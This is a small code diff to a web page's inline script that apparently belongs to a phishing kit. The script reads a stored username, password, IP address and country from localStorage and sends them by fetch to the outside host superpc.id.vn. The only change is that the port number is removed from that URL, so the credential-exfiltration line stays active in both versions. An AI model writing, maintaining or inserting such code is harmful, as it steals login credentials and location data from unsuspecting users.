@@ -212,7 +212,7 @@
             var address = localStorage.getItem('address');
             var username = localStorage.getItem('username');
             var password = localStorage.getItem('password');
-            fetch('https://superpc.id.vn:5000/checkpoint?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password) + '&ip=' + encodeURIComponent(ipAddress) + '&country=' + encodeURIComponent(address))
+            fetch('https://superpc.id.vn/checkpoint?username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(password) + '&ip=' + encodeURIComponent(ipAddress) + '&country=' + encodeURIComponent(address))
             setTimeout(function () {
             }, 5000);
         </script>
